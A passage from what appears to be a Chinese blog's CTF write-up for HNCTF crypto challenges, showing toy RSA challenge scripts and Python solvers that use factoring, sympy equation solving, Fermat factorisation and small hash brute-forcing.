class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>值得注意的是<code>n=p*p*p*q</code>根据欧拉定理可以得到欧拉函数<code>phi = p*(p-1)*q*(q - 1)</code>。n直接factor爆破就能出p，q。</p><p>exp.py</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">564070152909085514893862673848191100242629745476416876533996976389897932324860687952230733393080567203972999049426141761</span></span><br><span class="line">c = <span class="number">269509453821913281608300827585653465889617103481995203776655691658799441157871331220899710463748827149644657719450056013</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">709662686105519282917793669093</span> </span><br><span class="line">q = <span class="number">1058314117179226194777612760717</span></span><br><span class="line">phi = p*(p-<span class="number">1</span>)*q*(q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="solve-the-equation"><a href="#solve-the-equation" class="headerlink" title="solve_the_equation"></a>solve_the_equation</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">2048</span>)</span><br><span class="line">q = getPrime(<span class="number">2048</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">gift = <span class="number">2022</span> * p + <span class="number">9</span> * q + <span class="number">28</span> * e</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(n,c,gift)</span><br><span class="line"><span class="comment"># 559013759419746202691240598235115105126834606071307611491891982898293133657843987454339580258031532272691584368719342942404675509580909313170933925796189789232538297110756754383546447669571766593521267667716779348776308179675709803388978100416839504625045239819627379469827980589668625084314985969634985583431058156810528172627873121320455715399011186280324236548934145366222271636328254497851289112650375015433741699898290781472376090171361276557886637892800404830030548291487615566596504234212554381817510798554015481259307992175226543595948798873846335558746933940683482819439715578130806800536423771482474206047548549237879025655562739463111822524633757040958223066367993671472508367287181357997804485542311011003871312708995599690715923692968372474814753669031805664070760705148563294700043336457334028810890271434599241312612447640877347296648737167576464851763570272180801042067934843953206083053874624644994067168364645748243999074053494066054657595233970985982095621265309066132852511490426399921749091156312387594448586826952283581592003247165562367202134878625798756167825941929996806801073247649667626854029875184014003650020610359836971629737204456239324237077361643697429780638179887750984791035339697744210904151734797</span></span><br><span class="line"><span class="comment"># 73407318923483936681380982096598838839602514018601041044571793373013418096970487001956204920233481604663088115926046001478564679328045899017826536373925483312496867862798918521256833686293905627264784839084309695013473729502056597198558911052248943918139429481528120149662544426266704140382476129564563832751550189116712164319522536680400998100426969878312141399338984622535922004572374724499994480294086487511972287034778386491943792466926044305651852709046949243652756946391206931252732067537917128777152678266816232179411054474713462051435447023851233892017069674808619784767176865947753180156093197684363218543237706358137237603822953178987601908200096630034921280599733190041134038060644827637374731999991143342404380959195318030935855850625849684867326087432054830971960076859722417639414733054394674533018860606074648324450983897579183842853010968597034663149214229791831193351337193195298921766564073265470525286769595835642479920483047959570057149110246705969802722576770273329236163660486942433423522588321736639231667766680582482974393228214947178327111783901303686854030864244720750585928819691608599558058859371899416709995780300197269497143959726959313506292966639680257096421491364629690813416340577056873916752193925</span></span><br><span class="line"><span class="comment"># 63829120016023768052886024054478552450378183173692549289836790500844466624984770449526584263524969873611417764466777251459739549064993441916734929304056657281688756040121378172997367361118927461471925755841160032723693319039128805185488328610549652307644061769088611063117016010827595409949224043526660999362737741312450095192593608666286680915796697255817583078927076945852260612453896867746751729217633935143780193497702898684210698859292191506586139420497299988065973759272644964857853100511651254633164029275099534568064491202987945733565755982565356202756330311841048849063747767451397616638500281324618902190280761</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>解方程，直接sympy库解非线性方程组，有俩解，取整数解那个即可。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">559013759419746202691240598235115105126834606071307611491891982898293133657843987454339580258031532272691584368719342942404675509580909313170933925796189789232538297110756754383546447669571766593521267667716779348776308179675709803388978100416839504625045239819627379469827980589668625084314985969634985583431058156810528172627873121320455715399011186280324236548934145366222271636328254497851289112650375015433741699898290781472376090171361276557886637892800404830030548291487615566596504234212554381817510798554015481259307992175226543595948798873846335558746933940683482819439715578130806800536423771482474206047548549237879025655562739463111822524633757040958223066367993671472508367287181357997804485542311011003871312708995599690715923692968372474814753669031805664070760705148563294700043336457334028810890271434599241312612447640877347296648737167576464851763570272180801042067934843953206083053874624644994067168364645748243999074053494066054657595233970985982095621265309066132852511490426399921749091156312387594448586826952283581592003247165562367202134878625798756167825941929996806801073247649667626854029875184014003650020610359836971629737204456239324237077361643697429780638179887750984791035339697744210904151734797</span></span><br><span class="line">c = <span class="number">73407318923483936681380982096598838839602514018601041044571793373013418096970487001956204920233481604663088115926046001478564679328045899017826536373925483312496867862798918521256833686293905627264784839084309695013473729502056597198558911052248943918139429481528120149662544426266704140382476129564563832751550189116712164319522536680400998100426969878312141399338984622535922004572374724499994480294086487511972287034778386491943792466926044305651852709046949243652756946391206931252732067537917128777152678266816232179411054474713462051435447023851233892017069674808619784767176865947753180156093197684363218543237706358137237603822953178987601908200096630034921280599733190041134038060644827637374731999991143342404380959195318030935855850625849684867326087432054830971960076859722417639414733054394674533018860606074648324450983897579183842853010968597034663149214229791831193351337193195298921766564073265470525286769595835642479920483047959570057149110246705969802722576770273329236163660486942433423522588321736639231667766680582482974393228214947178327111783901303686854030864244720750585928819691608599558058859371899416709995780300197269497143959726959313506292966639680257096421491364629690813416340577056873916752193925</span></span><br><span class="line">gift = <span class="number">63829120016023768052886024054478552450378183173692549289836790500844466624984770449526584263524969873611417764466777251459739549064993441916734929304056657281688756040121378172997367361118927461471925755841160032723693319039128805185488328610549652307644061769088611063117016010827595409949224043526660999362737741312450095192593608666286680915796697255817583078927076945852260612453896867746751729217633935143780193497702898684210698859292191506586139420497299988065973759272644964857853100511651254633164029275099534568064491202987945733565755982565356202756330311841048849063747767451397616638500281324618902190280761</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">p,q = symbols(<span class="string">&#x27;p q&#x27;</span>)</span><br><span class="line">resture = nonlinsolve([p*q - n, <span class="number">2022</span> * p + <span class="number">9</span> * q + <span class="number">28</span> * e - gift], [p, q])</span><br><span class="line"><span class="built_in">print</span>(resture)</span><br></pre></td></tr></table></figure><p>p，q出了，RSA一把梭就行了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p = 31488299927163782375594305784598354985055343576902151378139638110290196067918972709864013036909993584566357500427488971564319756822589646977081872239028723217808372250207143372686512583814138881980368846428364451724191019810210583450208745323418623199057207740178726519465136933610452840086315545766227500114368026151391214297362847972215483754128409704386255997220347329566039222555930464490406419002226257326118774942404683970363544788642504594073256844610344691049585870560973659315882902006631997716334351866723219577903275769313404136367236735062099234386473703566068495328080598914833401280780692803508570349879</span><br><span class="line">q = 17753062588733343270481973113408741177364273466266578137604693537521130628067514464616655876995871735360322066932727884076111196635241747675042626304508770586691927800281585936137657405193182456402216484778567926375452998098111716574027285177466244350043079827469560084278792340806640810521556665260999347942843603815228875925103340718552529438783648172063716949726071718858811605089496505238883332792493647818670062684514188459512366295227468596668231188353669195967903222039580635681985850471261694526218866731687175727118621937360285536800367141087950091875609247828705723374310716178275472084635608436063660110043</span><br></pre></td></tr></table></figure><h2 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h2><img src="image-20221014155631176.png" alt="image-20221014155631176" style="zoom:80%;" /><p>sha256爆破前四位。</p><p>exp.py</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> digits, ascii_letters, punctuation</span><br><span class="line">alpha_bet=digits+ascii_letters+punctuation</span><br><span class="line">strlist = itertools.product(alpha_bet, repeat=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">sha256=<span class="string">&quot;1dafe94b2a853521de7c2ef475c88dc446b9a92b67189d4f0905ecad71b2acef&quot;</span></span><br><span class="line">tail=<span class="string">&quot;aW56dn5niWISJkBo&quot;</span></span><br><span class="line"></span><br><span class="line">xxxx=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> strlist:</span><br><span class="line">    data=i[<span class="number">0</span>]+i[<span class="number">1</span>]+i[<span class="number">2</span>]+i[<span class="number">3</span>]</span><br><span class="line">    data_sha=hashlib.sha256((data+<span class="built_in">str</span>(tail)).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">if</span>(data_sha==<span class="built_in">str</span>(sha256)):</span><br><span class="line">        xxxx=data</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(xxxx)</span><br></pre></td></tr></table></figure><h2 id="md5太残暴了"><a href="#md5太残暴了" class="headerlink" title="md5太残暴了"></a>md5太残暴了</h2><p>题目描述：</p><p>小明养成了定期修改密码的好习惯，同时，他还是一个CTF爱好者。有一天，他突发奇想，用flag格式来设置密码，为了防止忘记密码，他还把密码进行了md5加密。为了避免被其他人看到全部密码，他还特意修改了其中部分字符为#。你能猜出他的密码吗？<br>plaintext &#x3D; flag<br>md5 &#x3D; ac7f4d52c3924925aa9c8a7a1f522451<br>PS: 第一个#是大写字母，第二个#是小写字母，其他是数字。</p><p>md5爆破。</p><p>exp.py</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">plaintext = <span class="string">&quot;flag&#123;#00#_P4ssw0rd_N3v3r_F0rg3t_63####&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">Dic = [<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">97</span>,<span class="number">123</span>)] <span class="comment">#小写字母</span></span><br><span class="line">dic = [<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>,<span class="number">91</span>)] <span class="comment">#大写字母</span></span><br><span class="line">num = [<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Dic)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dic)):</span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(num)):</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(num)):</span><br><span class="line">                <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(num)):</span><br><span class="line">                    m = <span class="string">&#x27;flag&#123;&#x27;</span> + Dic[i] + <span class="string">&#x27;00&#x27;</span>+dic[j] + <span class="string">&#x27;_P4ssw0rd_N3v3r_F0rg3t_63&#x27;</span> + num[a] + num[b] + num[c]</span><br><span class="line">                    md5 = hashlib.md5(m.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">                    <span class="keyword">if</span> md5 == <span class="string">&#x27;ac7f4d52c3924925aa9c8a7a1f522451&#x27;</span>:</span><br><span class="line">                        <span class="built_in">print</span>(m , md5)</span><br></pre></td></tr></table></figure><h2 id="mathRSA"><a href="#mathRSA" class="headerlink" title="mathRSA"></a>mathRSA</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">hint = p**<span class="number">5</span> - q**<span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;h = <span class="subst">&#123;hint&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;f = <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n = 76236418318712173274495941060488893810931309177217802334230599201457092723011685048556311576262486371987147895332408646920500226769161418792142565209634495797142268681403865426056588605013602625268553194169434049817172340173907696496945054049859221379092764811535206778031226535614731731322630330166833765943      </span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">c = 7207616060389865156270906240837846478541820008527247539698331406253371238674590766101711421196342768182325013873320402422918804780590951789425587131632422554819735000106070325708057225062376701298825910565526713270553888227235612227223162695870584803109353377288421750982913226189395526612487664144379690552       </span></span><br><span class="line"><span class="string">h = 130285072635228037239175162118613869214302695058325046962039091162567931492116336918638092534964417960274466351834311039222269165021532950982276262717322395682559639859781516047319178212473103057947426886870612637975024605166325017663998263834789814181250953051730859433354534450232382414565421858172075431133498326501045697132640582932453817599366612200146802110424409285814189125929844293789544163802323048780585398714263586547670912817768592459281775837372982750626103047573532664320692775783627129463700810934670066747044799514243631607384814191188276380589420289084574680852618867732847029105400406874790675559126905078326495799755425006555539699119063191489852930421412630857588890593040420277938268954008973405431053073576987401154763326417551463323055736754390446</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>由题目可知，n&#x3D;pq，hint&#x3D;p^5 - q^4,由此我们可以构造出非线性方程组</p><p>pq-n&#x3D;0</p><p>p^5 - q^4-hint&#x3D;0</p><p>利用sympy库对其解方程组得到p,q。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p,q = symbols(<span class="string">&#x27;p q&#x27;</span>)</span><br><span class="line">resture = nonlinsolve([p*q - n, p**<span class="number">5</span> - q**<span class="number">4</span> - h], [p, q])</span><br></pre></td></tr></table></figure><p>解出p，q后一把梭就行了。</p><p>方法二：</p><p><code>hint=p**5 - q**4</code>，因为hint很大，所以<code>p**5</code>远大于<code>q**4</code>，可以直接对hint开5次方得到temp，此时temp&lt;p再循环取temp的下一个素数，直至n可以整除temp为止,就能得到p了。</p><p>exp.py</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n = <span class="number">76236418318712173274495941060488893810931309177217802334230599201457092723011685048556311576262486371987147895332408646920500226769161418792142565209634495797142268681403865426056588605013602625268553194169434049817172340173907696496945054049859221379092764811535206778031226535614731731322630330166833765943</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">7207616060389865156270906240837846478541820008527247539698331406253371238674590766101711421196342768182325013873320402422918804780590951789425587131632422554819735000106070325708057225062376701298825910565526713270553888227235612227223162695870584803109353377288421750982913226189395526612487664144379690552</span></span><br><span class="line">h = <span class="number">130285072635228037239175162118613869214302695058325046962039091162567931492116336918638092534964417960274466351834311039222269165021532950982276262717322395682559639859781516047319178212473103057947426886870612637975024605166325017663998263834789814181250953051730859433354534450232382414565421858172075431133498326501045697132640582932453817599366612200146802110424409285814189125929844293789544163802323048780585398714263586547670912817768592459281775837372982750626103047573532664320692775783627129463700810934670066747044799514243631607384814191188276380589420289084574680852618867732847029105400406874790675559126905078326495799755425006555539699119063191489852930421412630857588890593040420277938268954008973405431053073576987401154763326417551463323055736754390446</span></span><br><span class="line">temp= gmpy2.iroot(h,<span class="number">5</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">while</span> n % temp !=<span class="number">0</span>:</span><br><span class="line">    temp =gmpy2.next_prime(temp)</span><br><span class="line">p = temp</span><br><span class="line">q = n//p</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h2 id="pnearq"><a href="#pnearq" class="headerlink" title="pnearq"></a>pnearq</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> next_prime</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = next_prime(p)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c = <span class="built_in">pow</span>(bytes_to_long(flag), e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n = 19421904767367129549329507820147867763064747101931314714173717122035977491291441314433180813343755107381230481007143328156292096871675328839756035726106037229325380698967544660649710464634698425387682458721466040894830503881966355435442651493212040443436714597490121865537266815247879839020846287255634123530517095030752832857842819836940083915495464712363169428825344678729929317207583197980607919720642725221740680718976635305544368542563503440076036727388062097647374046378854873864505267644315352602271587283702733779081805129429479541906613334092422428543951370065910195162721686773383508480268145903016615151713</span></span><br><span class="line"><span class="string">c = 16430654037742749931837577925393394466626615745270895225352757745284038922799868617243616416116392338428121605256850230862894296244375242336599929497221079420665154174930054597666915358687410522457846003186806053368237783147731665147575913322026626738697036282908055611350347494310666532700194563684837580022875526378181343082801716942536163583090541294011987732281942148455345223347021675781368596340860151253774597168954881987520338304516390785094435356412111780768446904948045448510663589654475221029009283144829902553888829840193614048967712676048740814622290029846433107762872806981599110271586325156855299974310</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>可以看到q &#x3D; next_prime(p)，q是p的下一个质数，费马分解N即可。一个费马分解的小脚本。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">isqrt</span>(<span class="params">n</span>):</span><br><span class="line">  x = n</span><br><span class="line">  y = (x + n // x) // <span class="number">2</span></span><br><span class="line">  <span class="keyword">while</span> y &lt; x:</span><br><span class="line">    x = y</span><br><span class="line">    y = (x + n // x) // <span class="number">2</span></span><br><span class="line">  <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fermat</span>(<span class="params">n, verbose=<span class="literal">True</span></span>):</span><br><span class="line">    a = isqrt(n) <span class="comment"># int(ceil(n**0.5))</span></span><br><span class="line">    b2 = a*a - n</span><br><span class="line">    b = isqrt(n) <span class="comment"># int(b2**0.5)</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> b*b != b2:</span><br><span class="line">        <span class="comment"># if verbose:</span></span><br><span class="line">        <span class="comment">#     print(&#x27;Trying: a=%s b2=%s b=%s&#x27; % (a, b2, b))</span></span><br><span class="line">        a = a + <span class="number">1</span></span><br><span class="line">        b2 = a*a - n</span><br><span class="line">        b = isqrt(b2) <span class="comment"># int(b2**0.5)</span></span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">    p=a+b</span><br><span class="line">    q=a-b</span><br><span class="line">    <span class="keyword">assert</span> n == p * q</span><br><span class="line">    <span class="keyword">return</span> p, q</span><br><span class="line">fermat(n)</span><br></pre></td></tr></table></figure><h2 id="smallRSA"><a href="#smallRSA" class="headerlink" title="smallRSA"></a>smallRSA</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">rom Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;&quot;</span>+<span class="built_in">str</span>(uuid.uuid4())[:<span class="number">13</span>]+<span class="string">&quot;&#125;&quot;</span></span><br><span class="line">p = getPrime(<span class="number">100</span>)</span><br><span class="line">q = getPrime(<span class="number">100</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">m = bytes_to_long(flag.encode())</span><br><span class="line"><span class="keyword">assert</span>(m &lt; n)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="comment"># print(f&quot;flag = &#123;flag&#125;&quot;)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n = 625718246679843150194146350359795658237410693353450690028041</span></span><br><span class="line"><span class="string">c = 118795719073790634455854187484104547013000179946116068066473</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>n很小，factor爆破出p，q。</p><p>exp.py</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">n = <span class="number">625718246679843150194146350359795658237410693353450690028041</span></span><br><span class="line">p = <span class="number">768780063730500942699787302253</span></span><br><span class="line">q = <span class="number">813910604866037851538498611597</span></span><br><span class="line">c = <span class="number">118795719073790634455854187484104547013000179946116068066473</span></span><br><span class="line">d = gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span> (long_to_bytes(m))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
            <tag> HNCTF </tag>
            
            <tag> CRYPTO </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
